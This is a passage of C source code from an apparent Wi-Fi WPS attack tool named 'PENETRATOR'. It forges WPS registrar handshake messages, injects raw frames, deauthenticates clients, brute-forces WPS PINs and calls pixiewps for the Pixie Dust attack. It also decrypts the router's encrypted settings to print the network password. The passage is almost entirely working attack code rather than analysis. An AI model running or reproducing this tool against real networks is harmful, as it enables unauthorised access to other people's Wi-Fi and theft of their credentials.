  char pkey[2048];
  while(1){
    if(msglen<4)break;
    int typ=get_data(akt,2,1);
    int len=get_data(akt+2,2,1);
    if(typ==4130&&akt[4]!=4)return 1;//MSG TYPE
    else if(typ==4122)raw2hex(akt+4,enonce,len);//E-NONCE
    else if(typ==4146)raw2hex(akt+4,pkey,len);//PKEY
    akt+=(4+len);
    msglen-=(4+len);
  }

  if(attack->m1)free(attack->m1);
  msglen=get_data(pkt+38,2,1)-14;
  attack->m1=malloc(msglen);
  memcpy(attack->m1,pkt+50,msglen);
  attack->m1l=msglen;
  attack->eap_id=pkt[37];
  strcpy(attack->pke,pkey);
  strcpy(attack->enonce,enonce);
  return 0;
}

void dh_get(ATTACK_INFO *attack,void *mysecret, void *mypublic){
  DH *dh=DH_new();
  dh->p=BN_bin2bn(dh_p,192,NULL);
  dh->g=BN_bin2bn(dh_g,1,NULL);

  DH_generate_key(dh);
  BN_bn2bin(dh->priv_key,mysecret);
  BN_bn2bin(dh->pub_key,mypublic);

  char publickey[2048];
  int len=hex2raw(attack->pke,publickey);
  BIGNUM *pkey=BN_bin2bn((unsigned char*)publickey,len,NULL);

  DH_compute_key((unsigned char*)attack->secret,pkey,dh);
 
  BN_free(pkey);
  DH_free(dh);

  char hashme[8194];
  char tgt[32];
  int2hex(attack->tgt_mac,tgt);

  hex2raw(attack->enonce,hashme);
  hex2raw(tgt,hashme+16);
  hex2raw(attack->rnonce,hashme+22);

  char *kdk=sha256_hmac(attack->secret,192,hashme,38);

  char *derived=kdf(kdk,"Wi-Fi Easy and Secure Key Derivation",640);
  memcpy(attack->derived,derived,80);

  free(kdk);
  free(derived);
}

void add_auth(ATTACK_INFO *attack,char *packet,int *len,void *last, int llen){
  char hashme[8194];
  int nl=*len;
  
  memcpy(hashme,last,llen);
  memcpy(hashme+llen,packet+58,nl-58);
  char *auther=sha256_hmac(attack->derived,32,hashme,llen+nl-58);
  
  packet[nl]=0x10;
  packet[nl+1]=0x05;
  packet[nl+2]=0x00;
  packet[nl+3]=0x08;
  memcpy(packet+nl+4,auther,8);
  free(auther);
  *len=nl+12;
}

int send_m2(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  char mysecret[192],mypublic[192];
  dh_get(attack,mysecret,mypublic);
  raw2hex(mypublic,attack->pkr,192);

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 08 01 3a 01 %s %s %s %s \
aa aa 03 00 00 00 88 8e 01 00 01 97 02 %02hhX 01 97 \
fe 00 37 2a 00 00 00 01 04 00 10 4a 00 01 10 10 \
22 00 01 05 10 1a 00 10 %s 10 39 00 10 %s 10 48 00 10 %s \
10 32 00 c0 %s 10 04 00 02 00 3f 10 10 00 02 00 0f \
10 0d 00 01 01 10 08 00 02 00 8c 10 21 00 09 4d \
69 63 72 6f 73 6f 66 74 10 23 00 07 57 69 6e 64 \
6f 77 73 10 24 00 08 36 2e 31 2e 37 36 30 31 10 \
42 00 01 00 10 54 00 08 00 01 00 50 f2 04 00 01 \
10 11 00 04 47 6c 61 75 10 3c 00 01 01 10 02 00 \
02 00 00 10 09 00 02 00 00 10 12 00 02 00 00 10 \
2d 00 04 80 06 00 01",tgt,src,tgt,sn,attack->eap_id,attack->enonce,attack->rnonce,attack->ruuid,attack->pkr);
  
  char raw[2048];
  int len=hex2raw(packet,raw);
  add_auth(attack,raw,&len,attack->m1,attack->m1l);  

  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending M2\n");
  return 0;
}

unsigned long long int dopixie(ATTACK_INFO *attack){
  if(!PIXIEDUST)return 100000000LLU;
  char cmd[4096];
  char auth[256];
  raw2hex(attack->derived,auth,32);
  sprintf(cmd,"pixiewps -e %s -r %s -s %s -z %s -a %s -n %s -m %s 2>/dev/null",attack->pke,attack->pkr,attack->ehash1,attack->ehash2,auth,attack->enonce,attack->rnonce);
  FILE *p=popen(cmd,"r");

  unsigned long long int ispin=100000000;

  while(1){
    memset(cmd,0,2048);
    if(!fgets(cmd,2048,p))break;
    if(!strncmp(cmd," [+] WPS pin:    ",17)){sscanf(cmd," [+] WPS pin:    %llu",&ispin);break;}
  }
  pclose(p);
  if(ispin==100000000&&attack->timelimit)attack->pixiefail=1;
  return ispin;
}

int parse_m3(ATTACK_INFO *attack){
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<40||pkt[0]!=8)return 1;
  int llcorg=get_data(pkt+27,3,0);
  int llctyp=get_data(pkt+30,2,0);
  if(llcorg!=0||llctyp!=36488||pkt[33]||pkt[36]!=1||pkt[40]!=254)return 1;
  int msglen=get_data(pkt+38,2,1)-14;
  unsigned char *akt=pkt+50;
  char rnonce[2048],ehash1[2048],ehash2[2048];
  while(1){
    if(msglen<4)break;
    int typ=get_data(akt,2,1);
    int len=get_data(akt+2,2,1);
    if(typ==4130&&akt[4]!=7)return 1;//MSG TYPE
    else if(typ==4116)raw2hex(akt+4,ehash1,len);
    else if(typ==4117)raw2hex(akt+4,ehash2,len);
    else if(typ==4153){raw2hex(akt+4,rnonce,len);if(strcmp(rnonce,attack->rnonce))return 1;}
    akt+=(4+len);
    msglen-=(4+len);
  }
  strcpy(attack->ehash1,ehash1);
  strcpy(attack->ehash2,ehash2);
  if(attack->m3)free(attack->m3);
  msglen=get_data(pkt+38,2,1)-14;
  attack->m3=malloc(msglen);
  memcpy(attack->m3,pkt+50,msglen);
  attack->m3l=msglen;
  attack->eap_id=pkt[37];

  if(!attack->printedshit){
    if(VERBOSE>1){
      printf("PKE: %s\n",attack->pke);
      printf("PKR: %s\n",attack->pkr);
      printf("EHASH1: %s\n",attack->ehash1);
      printf("EHASH2: %s\n",attack->ehash2);
      printf("AUTHKEY: ");printhex(attack->derived,32);
      printf("ENONCE: %s\n",attack->enonce);
      printf("RNONCE: %s\n",attack->rnonce);
    }
    attack->printedshit++;

    unsigned long long int pp=100000000;
    if(!attack->pixiewin)pp=dopixie(attack);
    if(pp!=100000000){
       attack->pixiewin=1;
       char pin[9];
       sprintf(pin,"%08llu",pp);
       sem_wait(&(attack->pins->mutex));

       PINLIST *add=malloc(sizeof(PINLIST));
       add->psk=pp/10000;
       add->next=attack->pins->unused1;
       attack->pins->unused1=add;

       add=malloc(sizeof(PINLIST));
       add->psk=(pp-((pp/10000)*10000))/10;
       add->next=attack->pins->unused2;
       attack->pins->unused2=add;
       attack->pins->psk2=add->psk;
       strcpy(attack->pin,pin);
       sem_post(&(attack->pins->mutex));
    }
  }

    

  return 0;
}

void randbytes(char *out,int len){
int i;
for(i=0;i<len;i++)out[i]=rand();
}

void make_rhash(ATTACK_INFO *attack,char *pin,void *rh1,void *rh2){
  char pke[192];
  char pkr[192];
  hex2raw(attack->pke,pke);
  hex2raw(attack->pkr,pkr);

  char *psk1=sha256_hmac(attack->derived,32,pin,4);

  char hashme[2048];
  memcpy(hashme,attack->rs1,16);
  memcpy(hashme+16,psk1,16);
  free(psk1);

  memcpy(hashme+32,pke,192);
  memcpy(hashme+32+192,pkr,192);

  void *RH1=sha256_hmac(attack->derived,32,hashme,32+192+192);
  memcpy(rh1,RH1,32);
  free(RH1);
  
  char *psk2=sha256_hmac(attack->derived,32,pin+4,4);

  memcpy(hashme,attack->rs2,16);
  memcpy(hashme+16,psk2,16);
  free(psk2);
  void *RH2=sha256_hmac(attack->derived,32,hashme,32+192+192);
  memcpy(rh2,RH2,32);
  free(RH2);
}

void make_encset(ATTACK_INFO *attack,char *encset,int nonce){
  encset[0]=0x10;
  encset[1]=0x18;
  encset[2]=0x00;
  encset[3]=0x40;


  memcpy(encset+4,attack->iv,16);

  encset[20]=0x10;
  if(nonce)encset[21]=0x40;
  else encset[21]=0x3F;
  encset[22]=0x00;
  encset[23]=0x10;
  
  if(nonce)memcpy(encset+24,attack->rs2,16);
  else memcpy(encset+24,attack->rs1,16);

  char *hash=sha256_hmac(attack->derived,32,encset+20,20);

  encset[40]=0x10;
  encset[41]=0x1e;
  encset[42]=0x00;
  encset[43]=0x08;

  memcpy(encset+44,hash,8);
  memset(encset+52,16,16);

  AES_KEY enc_key;
  AES_set_encrypt_key((unsigned char*)attack->derived+32,128,&enc_key);

  char enc_out[2048];
  char tmpiv[2048];
  memcpy(tmpiv,encset+4,16);

  AES_cbc_encrypt((unsigned char*)encset+20,(unsigned char*)enc_out,48,&enc_key,(unsigned char*)tmpiv,AES_ENCRYPT);
  memcpy(encset+20,enc_out,48);
  free(hash);
}

int send_m4(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  char rh1[256],rh2[256],h1[256],h2[256];

  make_rhash(attack,attack->pin,rh1,rh2);

  raw2hex(rh1,h1,32);
  raw2hex(rh2,h2,32);

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 08 01 3a 01 %s %s %s %s \
aa aa 03 00 00 00 88 8e 01 00 00 c4 02 %02hhX 00 c4 \
fe 00 37 2a 00 00 00 01 04 00 10 4a 00 01 10 10 \
22 00 01 08 10 1a 00 10 %s 10 3d 00 20 %s 10 3e 00 20 \
%s",tgt,src,tgt,sn,attack->eap_id,attack->enonce,h1,h2);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  make_encset(attack,raw+len,0);

  len+=68;
  add_auth(attack,raw,&len,attack->m3,attack->m3l);  
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending M4\n");
  return 0;
}

void parse_enc_settings(ATTACK_INFO *attack,void *settings,int slen){
  AES_KEY enc_key;
  AES_set_decrypt_key((unsigned char*)attack->derived+32,128,&enc_key);
  char dec_out[2048];
  AES_cbc_encrypt((unsigned char*)settings+16,(unsigned char*)dec_out,slen-16,&enc_key,(unsigned char*)settings,AES_DECRYPT);
  
  slen-=16;
  int pad=dec_out[slen-1];
  slen-=pad;

  int i;
  int ispass=0;
  char pass[256];
  
  int lenbk=slen;

  unsigned char *akt=(unsigned char*)dec_out;
  while(1){
    if(slen<4)break;
    int typ=get_data(akt,2,1);
    int len=get_data(akt+2,2,1);
    if(typ==4135){memcpy(pass,akt+4,len);ispass=len;}
    akt+=(4+len);
    slen-=(4+len);
  }
  slen=lenbk;
  akt=(unsigned char*)dec_out;
  if(ispass)while(1){
    if(slen<4)break;
    int typ=get_data(akt,2,1);
    int len=get_data(akt+2,2,1);
    if(typ==4135){memcpy(pass,akt+4,len);ispass=len;}
    else{
      if(VERBOSE>0){
        printf("[PENETRATOR] Unknown encrypted attribute:\n");
        printf("\tType:\t\t0x%04X\n",typ);
        printf("\tHEX Value:\t");
        for(i=0;i<len;i++){
          if(i)putchar(' ');
          printf("%02hhX",akt[4+i]);
        }
        printf("\n\n");
      }
    }
    akt+=(4+len);
    slen-=(4+len);
  }

  if(ispass){
    memset(attack->foundpass,0,256);
    memcpy(attack->foundpass,pass,ispass);
    strcpy(attack->foundpin,attack->pin);

    pASSES *add=malloc(sizeof(pASSES));
    strcpy(add->pin,attack->pin);
    memset(add->pass,0,256);
    memset(add->ssid,0,256);

    strcpy(add->ssid,attack->ssid);
    memcpy(add->pass,pass,ispass);

    sem_wait(&passes_sem);

    add->next=passlist;
    add->passlen=ispass;
    passlist=add;

    sem_post(&passes_sem);
    
    if(VERBOSE>0){
      printf("[PENETRATOR] Password: '");
      for(i=0;i<ispass;i++)putchar(pass[i]);
      printf("' HEX: ");
      for(i=0;i<ispass;i++){if(i)putchar(' ');printf("%02hhX",pass[i]);}
      printf("\n\n");
    }
  }
}

int parse_m5(ATTACK_INFO *attack){
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<40||pkt[0]!=8)return 1;
  int llcorg=get_data(pkt+27,3,0);
  int llctyp=get_data(pkt+30,2,0);
  if(llcorg!=0||llctyp!=36488||pkt[33]||pkt[36]!=1||pkt[40]!=254)return 1;
  int msglen=get_data(pkt+38,2,1)-14;
  unsigned char *akt=pkt+50;

  int slen;
  char settings[2048],rnonce[2048];
  while(1){
    if(msglen<4)break;
    int typ=get_data(akt,2,1);
    int len=get_data(akt+2,2,1);
    if(typ==4130&&akt[4]!=9)return 1;//MSG TYPE
    else if(typ==4120){memcpy(settings,akt+4,len);slen=len;}//ENCRYPTED SETTINGS
    else if(typ==4153){raw2hex(akt+4,rnonce,len);if(strcmp(rnonce,attack->rnonce))return 1;}
    akt+=(4+len);
    msglen-=(4+len);
  }  

  parse_enc_settings(attack,settings,slen);

  if(attack->m5)free(attack->m5);
  msglen=get_data(pkt+38,2,1)-14;
  attack->m5=malloc(msglen);
  memcpy(attack->m5,pkt+50,msglen);
  attack->m5l=msglen;
  attack->eap_id=pkt[37];
  return 0;
}

int send_m6(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 08 01 3a 01 %s %s %s %s \
aa aa 03 00 00 00 88 8e 01 00 00 7c 02 %02hhx 00 7c \
fe 00 37 2a 00 00 00 01 04 00 10 4a 00 01 10 10 \
22 00 01 0a 10 1a 00 10 %s",tgt,src,tgt,sn,attack->eap_id,attack->enonce);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  make_encset(attack,raw+len,1);

  len+=68;
  add_auth(attack,raw,&len,attack->m5,attack->m5l);  
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending M6\n");
  return 0;
}

int parse_m7(ATTACK_INFO *attack){
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<40||pkt[0]!=8)return 1;
  int llcorg=get_data(pkt+27,3,0);
  int llctyp=get_data(pkt+30,2,0);
  if(llcorg!=0||llctyp!=36488||pkt[33]||pkt[36]!=1||pkt[40]!=254)return 1;
  int msglen=get_data(pkt+38,2,1)-14;
  unsigned char *akt=pkt+50;

  int slen;
  char settings[2048],rnonce[2048];
  while(1){
    if(msglen<4)break;
    int typ=get_data(akt,2,1);
    int len=get_data(akt+2,2,1);
    if(typ==4130&&akt[4]!=11)return 1;//MSG TYPE
    else if(typ==4120){memcpy(settings,akt+4,len);slen=len;}//ENCRYPTED SETTINGS
    else if(typ==4153){raw2hex(akt+4,rnonce,len);if(strcmp(rnonce,attack->rnonce))return 1;}
    akt+=(4+len);
    msglen-=(4+len);
  }

  parse_enc_settings(attack,settings,slen);

  if(attack->m5)free(attack->m5);
  msglen=get_data(pkt+38,2,1)-14;
  attack->m5=malloc(msglen);
  memcpy(attack->m5,pkt+50,msglen);
  attack->m5l=msglen;
  attack->eap_id=pkt[37];
  return 0;
}

int send_nack(ATTACK_INFO *attack,char *rnonce,unsigned char eap_id){
  if(VERBOSE>0)printf("[PENETRATOR] Sending NACK\n");
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 08 01 34 00 %s %s %s %s \
aa aa 03 00 00 00 88 8e 01 00 00 46 02 %02hhX 00 46 fe 00 37 2a 00 00 00 01 03 00 10 4a 00 01 10 10 \
22 00 01 0e 10 1a 00 10 %s 10 39 00 10 %s 10 09 00 02 00 00",tgt,src,tgt,sn,eap_id,attack->enonce,rnonce);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);
  return 0;
}

int parse_nack(ATTACK_INFO *attack,char *rnonce,unsigned char *eap_id){
  if(FUCKNACK)return 1;
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<40||pkt[0]!=8)return 1;
  int llcorg=get_data(pkt+27,3,0);
  int llctyp=get_data(pkt+30,2,0);
  if(llcorg!=0||llctyp!=36488||pkt[33]||pkt[36]!=1||pkt[40]!=254||pkt[48]!=3)return 1;

  int msglen=get_data(pkt+38,2,1)-14;
  unsigned char *akt=pkt+50;
  while(1){
    if(msglen<4)break;
    int typ=get_data(akt,2,1);
    int len=get_data(akt+2,2,1);
    if(typ==4153)raw2hex(akt+4,rnonce,16);
    else if(typ==4122)raw2hex(akt+4,attack->enonce,16);
    akt+=(4+len);
    msglen-=(4+len);
  }
  *eap_id=pkt[37];
  return 0;
}

int istimeout(ATTACK_INFO *attack){
  if(attack->waittil>gettick())return 0;
  if((gettick()-attack->lastsend)>TIMEOUT)return 1;
  return 0;
}

void restart(ATTACK_INFO *attack,int advance,int nack){
  if(nack){send_nack(attack,attack->rnonce,attack->eap_id);eap_terminate(attack,attack->eap_id);}
  if(advance&&attack->wins)attack->inarow++;
  else if(advance&&!attack->wins)attack->inarow=1;
  else if(!advance&&!attack->wins)attack->inarow++;
  else if(!advance&&attack->wins)attack->inarow=1;

  attack->wins=advance;
  attack->eap_id=0;
  char uuid[16];
  char rnonce[16];
  randbytes(uuid,16);
  randbytes(rnonce,16);
  randbytes(attack->rs1,16);
  randbytes(attack->rs2,16);
  randbytes(attack->iv,16);

  raw2hex(uuid,attack->ruuid,16);
  raw2hex(rnonce,attack->rnonce,16);

  if(attack->lastpsk!=-1&&!advance)key_return(attack->pins,attack->lastpsk,attack->lastmode);
  if(attack->lastpsk!=-1&&advance)key_remove(attack->pins,attack->lastpsk,attack->lastmode);
  if(attack->gotm5&&!attack->lastmode)key_mode(attack->pins,attack->lastpsk);

  memset(attack->sent,0,6);
  attack->gotm5=0;
  attack->resended=0;
  attack->printedshit=0;

  int mode=2;
  unsigned long long int key;
  while(mode==2){
  mode=key_get(attack->pins,&(attack->lastpsk));
  attack->lastmode=mode;
  if(!mode){
      key=(attack->lastpsk)*1000;
      key+=attack->pins->psk2;
      int cmp=ComputeChecksum(key);
      key*=10;
      key+=cmp;
    }else if(mode==1){
      key=attack->pins->psk1*1000;
      key+=(attack->lastpsk);
      int cmp=ComputeChecksum(key);
      key*=10;
      key+=cmp;
    }else if(mode==2)usleep(1000000);
  }
  if(mode==3){
    if(VERBOSE>0)printf("[PENETRATOR] Exhausted all PINs\n");
    attack->ded=1;
    return;
  }
  if(VERBOSE>0)printf("[PENETRATOR] PIN: %08llu\n",key);
  sprintf(attack->pin,"%08llu",key);
  sscanf(attack->pin,"%llu",&attack->lastsuc);

  if(!attack->wins&&attack->inarow&&(attack->inarow%10)==0){
    if(VERBOSE>0)printf("%d FAILS IN A ROW - SLEEP %llu sec\n",attack->inarow,FAILSLEEP*(attack->inarow/10));
    attack->waittil=gettick()+FAILSLEEP*1000*(attack->inarow/10); 
  }
  usleep(MIDDELAY*1000LLU);
  deauth(attack);
  deauth(attack);
  deauth(attack);
  auth(attack);
}

void resend(ATTACK_INFO *attack){
  if(VERBOSE>0)printf("[PENETRATOR] Resending last packet\n");
  ((unsigned char*)(attack->resendmsg))[9]|=8;//set retransmission flag
  sem_wait(&sendmutex);
  pcap_inject(fp,attack->resendmsg,attack->resendlen);
  attack->lastsend=gettick();
  sem_post(&sendmutex);
  attack->resended++;
}

void handletimeout(ATTACK_INFO *attack){
  if(attack->waittil>gettick())return;
  if(VERBOSE>0)printf("[PENETRATOR] Timeout occured\n");
  if(attack->resended<MAXRESEND)resend(attack);
  else {
    if(attack->sent[3])restart(attack,0,1);
    else restart(attack,0,0);
  }
}

int respond(ATTACK_INFO *attack){
  char nack_rnonce[2048];
  unsigned char nack_eapid;
  if(!parse_nack(attack,nack_rnonce,&nack_eapid)&&attack->sent[3]){
    if(VERBOSE>0)printf("[PENETRATOR] Received NACK\n");
     send_nack(attack,attack->rnonce,nack_eapid);
     eap_terminate(attack,nack_eapid);
     if(attack->sent[4])restart(attack,1,0);
     else restart(attack,0,0);
  }

  if(!attack->sent[0]&&!parse_auth_response(attack)){
    if(VERBOSE>0)printf("[PENETRATOR] Received auth response\n");
    assoc(attack);attack->sent[0]++;
  }else if(!attack->sent[1]&&!parse_assoc_response(attack)){
    if(VERBOSE>0)printf("[PENETRATOR] Association successful\n");
    eapol_start(attack);attack->sent[1]++;
  }else if(attack->sent[1]&&!attack->sent[2]&&!parse_identity_rq(attack)){
    if(VERBOSE>0)printf("[PENETRATOR] Received identity request\n");
    identity_response(attack);attack->sent[2]++;
  }else if(attack->sent[2]&&!attack->sent[3]&&!attack->sent[3]&&!parse_m1(attack)){
    if(VERBOSE>0)printf("[PENETRATOR] Received M1\n");
    send_m2(attack);
    attack->sent[3]++;
  }else if(attack->sent[3]&&!attack->sent[4]&&!attack->sent[4]&&!parse_m3(attack)){
    if(VERBOSE>0)printf("[PENETRATOR] Received M3\n");
    send_m4(attack);
    attack->sent[4]++;
  }else if(attack->sent[4]&&!attack->sent[5]&&!attack->sent[5]&&!parse_m5(attack)){
    if(VERBOSE>0)printf("[PENETRATOR] Received M5\n");
    attack->gotm5++;
    send_m6(attack);
    attack->sent[5]++;
  }else if(attack->sent[5]&&!parse_m7(attack)){
    if(VERBOSE>0)printf("[PENETRATOR] Received M7\n");
    send_nack(attack,attack->rnonce,attack->eap_id);
    return 1;
  }
  return 0;
}

void *attack_thread(void *data){
  ATTACK_INFO *attack=data;
  strcpy(attack->foundpass,"unknown");
  strcpy(attack->foundpin,"unknown");
  if(VERBOSE>0)printf("[PENETRATOR] Waiting for beacon..\n");
  while(1){
    struct timespec timeout;
    clock_gettime(CLOCK_REALTIME,&timeout);
    timeout.tv_nsec+=TIMEOUT*1000000LLU;
    if(timeout.tv_nsec>=1000000000LLU){timeout.tv_sec+=timeout.tv_nsec/1000000000LLU;timeout.tv_nsec%=1000000000LLU;}
    if(sem_timedwait(&(attack->mutex),&timeout)==-1){
      if(VERBOSE>0)printf("[PENETRATOR] Still no beacon..\n");
      if((attack->timelimit&&attack->timelimit<gettick())||attack->pixiefail)break;
      continue;
    }
    if(attack->packet==NULL||(attack->timelimit&&attack->timelimit<gettick())||attack->pixiefail){sem_post(&(attack->ready));break;}
    unsigned char *pkt=attack->packet+attack->radiotap_len;
    int len=attack->len-attack->radiotap_len;
    if(pkt[0]==128){
        pkt+=36;
        len-=36;
        parsebeacon(pkt,len,&(attack->ssid),&(attack->wps),&(attack->wpslock),NULL);
        free(attack->packet);
        attack->packet=NULL;
        sem_post(&(attack->ready));
        break;
    }
  }
  if(attack->ssid){
    if(VERBOSE>0)printf("[PENETRATOR] Beacon received ok, ssid: %s\n",attack->ssid);
    restart(attack,0,0);
    while(1){
      struct timespec timeout;
      clock_gettime(CLOCK_REALTIME,&timeout);
      timeout.tv_nsec+=TIMEOUT*1000000LLU;
      if(timeout.tv_nsec>=1000000000LLU){timeout.tv_sec+=timeout.tv_nsec/1000000000LLU;timeout.tv_nsec%=1000000000LLU;}

      if(sem_timedwait(&(attack->mutex),&timeout)==-1){
        handletimeout(attack);
        if((attack->timelimit&&attack->timelimit<gettick())||attack->pixiefail)break;
        continue;
      }
      if(attack->packet==NULL||(attack->timelimit&&attack->timelimit<gettick())||attack->pixiefail||attack->ded){sem_post(&(attack->ready));break;}
      if(istimeout(attack)){
        handletimeout(attack);
        free(attack->packet);
        attack->packet=NULL;
        sem_post(&(attack->ready));
        continue;
      }
      unsigned char *pkt=attack->packet+attack->radiotap_len;
      int len=attack->len-attack->radiotap_len;
      if(pkt[0]!=128&&attack->waittil<gettick()&&respond(attack)){
        if(VERBOSE>0)printf("KEY FOUND\n");
        free(attack->packet);
        attack->packet=NULL;
        break;
      }
      free(attack->packet);
      attack->packet=NULL;
      sem_post(&(attack->ready));
    }
  }else if(VERBOSE>0)printf("[PENETRATOR] No beacon received\n");
  attack->active=0;
  attack->timelimit=1;
  sem_post(&(attack->ready));

  /*if(VERBOSE>0){//Data is no longer needed when "gui" is not used
    sem_wait(&mutex);
    ATTACK_INFO *akt=attack_list;
    ATTACK_INFO *last=NULL;
    while(akt){
      if(akt->thread_id==attack->thread_id){
        if(last)last->next=akt->next;
        else attack_list=akt->next;
        break;
      }
      last=akt;
      akt=akt->next;
    }

    sem_post(&mutex);
    if(attack->ssid)free(attack->ssid);
    if(attack->packet)free(attack->packet);
    if(attack->m1)free(attack->m1);
    if(attack->m3)free(attack->m3);
    if(attack->m5)free(attack->m5);
    sem_destroy(&(attack->mutex));
    sem_destroy(&(attack->ready));
    free(attack);
  }*/
  return NULL;
}

void lowercase(char *in){int i; for(i=0;in[i];i++)if(in[i]>='A'&&in[i]<='F')in[i]+=32;}

void addattack(char *src,char *tgt,PINS *key,unsigned long long int limit,char *ssid){
  sem_wait(&mutex);

  ATTACK_INFO *add=calloc(1,sizeof(ATTACK_INFO));
  add->src_mac=hex2int(src,1);
  add->tgt_mac=hex2int(tgt,1);
  add->pins=key;
  add->lastpsk=-1;
  add->ssid=ssid;
  if(limit)add->timelimit=gettick()+limit;
  add->next=attack_list;
  add->thread_id=threads++;
  add->active=1;
  sem_init(&(add->mutex),0,0);
  sem_init(&(add->ready),0,0);

  attack_list=add;

  pthread_t th;
  pthread_create(&th,0,attack_thread,add);
  sem_post(&mutex);
}

char *incmac(char *mac,int add){
  unsigned long long int tmp;
  hex2raw(mac,&tmp);
  tmp+=add;
  char *ret=malloc(32);
  char *numa=(char*)&tmp;
  sprintf(ret,"%02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX",numa[0],numa[1],numa[2],numa[3],numa[4],numa[5]);
  return ret;
}

void addattackex(char *src,char *tgt,int n,unsigned long long int limit,char *ssid){
  PINS *yolo=malloc(sizeof(PINS));
  key_init(yolo);
  if(homedir){
    char total[512];
    unsigned long long int nmac=hex2int(tgt,1);
    sprintf(total,"%s/.penetrator/%llX",homedir,nmac);
    FILE *f=fopen(total,"r");
    if(f){
      fclose(f);
      key_load(total,yolo);
    }else key_gen(yolo);
  }else key_gen(yolo);
  
  int i;
  for(i=0;i<n;i++){
    char *mac=incmac(src,i);
    addattack(mac,tgt,yolo,limit,ssid);
    free(mac);
  }
}

void setchannel(char *device,int channel){
  double freq[]={2.412,2.417,2.422,2.427,2.432,2.437,2.442,2.447,2.452,2.457,2.462,2.467,2.472};
  if(AKTCHANNEL==channel)return;
  if(channel<1||channel>13){printf("Error setting channel %d\n",channel);exit(1);}
  int i;
  for(i=0;i<10;i++){
    char tmp[512];
    sprintf(tmp,"iwconfig %s channel %d 2>/dev/null",device,channel);
    pclose(popen(tmp,"r"));
    sprintf(tmp,"iwconfig %s",device);
    FILE *p=popen(tmp,"r");
    double iwfreq=0;

    while(1){
      memset(tmp,0,512);
      if(!fgets(tmp,512,p))break;
      char *x=strstr(tmp,"Frequency:");
      if(!x)continue;
      sscanf(x,"Frequency:%lf",&iwfreq);
    }  
    pclose(p);
    if(iwfreq==freq[channel-1])break;
  }
  if(i==10){printf("Error setting channel %d\n",channel);exit(0);}
  AKTCHANNEL=channel;
}

int detectpixie(){
  FILE *p=popen("which pixiewps 2>/dev/null","r");
  int lines=0;
  while(1){
    char tmp[512];
    if(!fgets(tmp,512,p))break;
    lines++;
  }
  pclose(p);
  return lines;
}

void savelist(ATTACK_INFO *atak){
  ATTACK_INFO *akt=atak;
  while(akt){
    char total[512];
    if(!homedir){printf("\n[PENETRATOR] Unable to save session %llX, is HOME env var set?",akt->tgt_mac);akt=akt->next;continue;}
    sprintf(total,"%s/.penetrator/%llX",homedir,akt->tgt_mac);
    key_save(total,akt->pins);
    printf("\nSession %llX saved",akt->tgt_mac);
    akt=akt->next;
  }
  printf("\n");
}

void ctrlc(int haha){
  if(autoatak){sem_wait(&mutex);attack_list=NULL;sem_post(&mutex);return;}
  sem_wait(&mutex);
  ATTACK_INFO *akt=attack_list;
  while(akt){
    char total[512];
    if(!homedir){printf("\n[PENETRATOR] Unable to save session %llX, is HOME env var set?",akt->tgt_mac);akt=akt->next;continue;}
    sprintf(total,"%s/.penetrator/%llX",homedir,akt->tgt_mac);
    key_save(total,akt->pins);
    printf("\nSession %llX saved",akt->tgt_mac);
    akt=akt->next;
  }
  printf("\n");
  exit(1);
}

void *init_device(void *param){
char *device=(char*)param;
  fp=pcap_open_live(device,65535,1,60000,NULL);
  if(!fp){printf("Error: Failed to open %s for capture\n",device);exit(1);}
  sem_post(&sendmutex);
  while(1){
    struct pcap_pkthdr head;
    const unsigned char *pkt=pcap_next(fp,&head);
    if(!pkt)continue;
    else parsepacket(pkt,head);
  }
  pcap_close(fp);
  return NULL;
}

void spaces(int n){
  int i;
  for(i=0;i<n;i++)putchar(' ');
}

void *gui(void *param){
  int i,j;
  while(1){
    if(killgui)break;
    if(VERBOSE>0){sleep(5000);continue;}

    int rows,cols;
    struct winsize w;
    ioctl(STDOUT_FILENO, TIOCGWINSZ, &w);
    rows=w.ws_row;
    cols=w.ws_col;
